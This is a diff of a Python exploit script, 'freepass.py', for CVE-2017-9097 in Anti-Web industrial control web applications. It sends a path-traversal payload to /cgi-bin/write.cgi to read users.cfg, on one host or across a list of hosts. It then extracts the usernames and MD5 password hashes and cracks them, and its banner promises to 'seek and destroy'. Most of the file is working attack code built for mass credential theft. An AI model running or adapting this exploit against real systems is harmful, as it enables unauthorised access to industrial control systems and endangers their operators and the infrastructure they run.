@@ -3,6 +3,8 @@ import requests
 import argparse
 from breakMd5 import *
 import time
+import sys
+
 import re
 
 headers = {}
@@ -20,50 +22,53 @@ class Colors:
 
 
 banner = '''
+.▄▄ · ▄▄▄ .▄▄▄ .▄ •▄      ▄▄▄·  ▐ ▄ ·▄▄▄▄      ·▄▄▄▄  ▄▄▄ ..▄▄ · ▄▄▄▄▄▄▄▄         ▄· ▄▌
+▐█ ▀. ▀▄.▀·▀▄.▀·█▌▄▌▪    ▐█ ▀█ •█▌▐███▪ ██     ██▪ ██ ▀▄.▀·▐█ ▀. •██  ▀▄ █·▪     ▐█▪██▌
+▄▀▀▀█▄▐▀▀▪▄▐▀▀▪▄▐▀▀▄·    ▄█▀▀█ ▐█▐▐▌▐█· ▐█▌    ▐█· ▐█▌▐▀▀▪▄▄▀▀▀█▄ ▐█.▪▐▀▀▄  ▄█▀▄ ▐█▌▐█▪
+▐█▄▪▐█▐█▄▄▌▐█▄▄▌▐█.█▌    ▐█ ▪▐▌██▐█▌██. ██     ██. ██ ▐█▄▄▌▐█▄▪▐█ ▐█▌·▐█•█▌▐█▌.▐▌ ▐█▀·.
+ ▀▀▀▀  ▀▀▀  ▀▀▀ ·▀  ▀     ▀  ▀ ▀▀ █▪▀▀▀▀▀•     ▀▀▀▀▀•  ▀▀▀  ▀▀▀▀  ▀▀▀ .▀  ▀ ▀█▄▀▪  ▀ • 
+
+ [+] 𝕊𝕖𝕖𝕜 𝕒𝕟𝕕 𝔻𝕖𝕤𝕥𝕣𝕠𝕪...
+ ( Breaking the credentials of your industrial control system )
 
 '''
+	# Seek and destroy...
 
 details = '''
+ # Test: 	Apps industrial OT over Server: "Anti-Web 3.0.x < 3.8.x"
+ # CVE:		CVE-2017-9097
+ # Date: 	15/05/2017
+ # Vendor:   	Multiples vendors
+ # Category:	Industrial OT webapps
 
-	Obtain and break the credentials of your industrial control system
+ # POC: 	https://www.youtube.com/watch?v=HdkZA1DO08Y 
 
+ by:
+   * Fernandez Ezequiel ( @capitan_alfa )
+   * Bertin Jose ( @bertinjoseb )
 '''
 parser = argparse.ArgumentParser(prog='freepass.py',
 								description=' [+] Obtain and break the credentials of your industrial control system .', 
 								epilog='[+] Demo: freepass.py --list vdr_alliance/host_list.txt --port 8080',
 								version="0.2")
 
-parser.add_argument('--host', dest="HOST",  help='host')
-parser.add_argument('--list', dest="HOST_LIST",  help='hosts', default=False)
-
-parser.add_argument('--port', dest="PORT",  help='set port (default = 80)',  default="80", required=False)
-#parser.add_argument('--show', dest="LEAK",  help='i wanna...',  choices=['all', 'mails', 'hash'], required=True)
-#parser.add_argument('--save', dest="FILE",  help='TO json')
+parser.add_argument('--host', dest="HOST",  		help='host')
+parser.add_argument('--list', dest="HOST_LIST",  	help='hosts', default=False)
+parser.add_argument('--port', dest="PORT",  		help='set port (default = 80)',  default="80", required=False)
 
 
-
-args        = parser.parse_args()
+args 	= parser.parse_args()
 
 HST   	= args.HOST
 LST   	= args.HOST_LIST
 PRT 	= args.PORT
-#xJson 	= args.FILE
-
-
-
-
-
-#OPT 	= (args.LEAK).lower()
-
-OPT = "all"
 
 print Colors.GREEN+banner
 print Colors.BLUE+details
 
 def reqLFI(hst, prt):
-	host 		= "http://"+hst+":"+prt+"/"
+	host 		=  "http://"+hst+":"+prt+"/"
 	fullHost 	=  "http://"+hst+":"+prt+"/cgi-bin/write.cgi"
-	fullHost2 	=  "http://"+hst+":"+str(8080)+"/cgi-bin/write.cgi"
 
 	LFI 	= "../../../../../../home/config/users.cfg"
 	ContLen = str(len(LFI))
@@ -80,8 +85,6 @@ def reqLFI(hst, prt):
 
 
 	print Colors.GREEN+"\n [*] HOST:\t"+Colors.ORANGE+host
-	# print Colors.GREEN+"\n [*] PRODUCT:\t"+Colors.ORANGE+host
-
 
 	thePost0 = "page=/&template="+LFI
 	
@@ -93,11 +96,11 @@ def reqLFI(hst, prt):
 # ----------------------------------- #
 ptrUsr =  re.compile(r"[\w.[]+[a-zA-Z0-9]+[\w.]]")
 
-#re para strings tipo "hash md5":
+#catch "hash md5":
 ptrPass =	re.compile(r"[a-f0-9]{32}")
 ptrMail = 	re.compile(r"\w+@\w+\D\w+\b")
 
-
+#poor [tab] solution
 def getTabs(nT):
 	tabs = "\t"
 	
@@ -112,31 +115,30 @@ def getTabs(nT):
 		tabs = (tabs)*1
 		return tabs
 
+title = ''' +---------------+-------------------------------------------------------+
+ | Users\t | hashes = MD5( Password + Username )\t\t\t |	
+ +---------------+-------------------------------------------------------+''' 
 
 
-if OPT == "all":
+if LST:
 
-	if LST:
-
-		with open(LST, 'r') as LH:
-			
+	with open(LST, 'r') as LH:
+		try:
+		# ----------------------------------------------------------------------------- 
 			for nHst in LH:
-				# print "== >" + nHst
 				try:
 					users_cfg = reqLFI(nHst[:-1], PRT)
 					# ----------------------------------- #
 					userList = ptrUsr.findall(users_cfg)
 					hashList = ptrPass.findall(users_cfg)
-					mails 	= ptrMail.findall(users_cfg)
+					#mails 	= ptrMail.findall(users_cfg)
 					# ----------------------------------- #
 
 					usersTot = len(userList) 
 					credsTot = len(hashList)
 
-					print " +---------------+-------------------------------------------------------+"
-					print " | Users\t | hashes = MD5( Password + Username )\t\t\t|"	
-					print " +---------------+-------------------------------------------------------+"	
-							
+					print title+Colors.DEFAULT
+
 					for nUser in range(0, usersTot):
 
 						# -- existe un hash? ------------------------- #
@@ -146,88 +148,54 @@ if OPT == "all":
 							hashCred = " --- "
 						# -- --------------- ------------------------- #
 						
-						username = userList[nUser]
-						plane = getMD5(hashCred, username)
+						username 	= userList[nUser]
+						plane 		= getMD5(hashCred, username)
 
-						print " | "+ username +  getTabs(len(username)) + hashCred +  getTabs(len(hashCred))+ "( "+plane+" )"
+						print Colors.ORANGE+" | "+Colors.DEFAULT + username +  getTabs(len(username)) + hashCred +  getTabs(len(hashCred))+ "( "+plane+" )"
 						
-					
 
-						#print " | "+username + ":  \t| " +hashCred + "\t|\t"+plane
-
-					print " +------------+----------------------------------------------------------+"+Colors.DEFAULT		
-
-
-
+					print Colors.ORANGE+" +---------------+-------------------------------------------------------+"+Colors.DEFAULT		
 
 				except Exception:
-					print "---"
-	elif HST: 
+					print Colors.RED+" [ Fail conection ] "+Colors.DEFAULT
+		# ----------------------------------------------------------------------------- 
+		except KeyboardInterrupt:
+			print Colors.RED+'\nInterrupted\n\n'+Colors.DEFAULT
+	        exit(0)
 
-		users_cfg = reqLFI(HST, PRT)
-		# ----------------------------------- #
-		userList = ptrUsr.findall(users_cfg)
-		hashList = ptrPass.findall(users_cfg)
-		mails 	= ptrMail.findall(users_cfg)
-		# ----------------------------------- #
 
-		usersTot = len(userList) 
-		credsTot = len(hashList)
 
-		print " +---------------+-------------------------------------------------------+"
-		print " | Users\t  | hashes = MD5( Password + Username )\t\t\t|"	
-		print " +---------------+-------------------------------------------------------+"	
-				
-		for nUser in range(0, usersTot):
+elif HST: 
+	users_cfg = reqLFI(HST, PRT)
+	# ----------------------------------- #
+	userList = ptrUsr.findall(users_cfg)
+	hashList = ptrPass.findall(users_cfg)
+	#mails 	= ptrMail.findall(users_cfg)
+	# ----------------------------------- #
 
-			# -- existe un hash? ------------------------- #
-			try:
-				hashCred = hashList[nUser]
-			except Exception:
-				hashCred = " --- "
-			# -- --------------- ------------------------- #
+	usersTot = len(userList) 
+	credsTot = len(hashList)
+
+	print title
 			
-			username = userList[nUser]
-			plane = getMD5(hashCred, username)
+	for nUser in range(0, usersTot):
 
-			print " | "+ username +  getTabs(len(username)) + hashCred +  getTabs(len(hashCred))+ "( "+plane+" )"
-			
+		# -- existe un hash? ------------------------- #
+		try:
+			hashCred = hashList[nUser]
+		except Exception:
+			hashCred = " --- "
+		# -- --------------- ------------------------- #
 		
+		username = userList[nUser]
+		plane = getMD5(hashCred, username)
 
-			#print " | "+username + ":  \t| " +hashCred + "\t|\t"+plane
+		print " | "+ username +  getTabs(len(username)) + hashCred +  getTabs(len(hashCred))+ "( "+plane+" )"
+		
+	print " +------------+----------------------------------------------------------+"+Colors.DEFAULT	
+	#print "\n"
 
-		print " +------------+----------------------------------------------------------+"+Colors.DEFAULT	
-		print "\n"
-
-	else:
-		failOpt = "HOST or HOST_LIST"
-		print failOpt
-		exit(0)
-
-elif (OPT == "mails"):
-	print "\n"
-
-
-elif (OPT == "hash"):
-	#fCred = open("credenciales.txt", 'w+')
-	print "hashes:"
-
-	with open(LST, 'r') as LH:
-		for nHst in LH:
-			# print "== >" + nHst
-			try:
-				theUsrConf = reqLFI(nHst[:-1], PRT)
-				# ----------------------------------- #
-				hashes 	= ptrPass.findall(theUsrConf)
-				# ----------------------------------- #
-				for creds in hashes:
-					print creds
-	#				fCred.write(creds+"\n")
-			except Exception:
-				print "---"
-
-
-
-# OUTPUT A UN ORDENADO Y LINDO JSON !
-# EN 3.2.1
-
+else:
+	failOpt = "HOST or HOST_LIST"
+	print failOpt
+	exit(0)
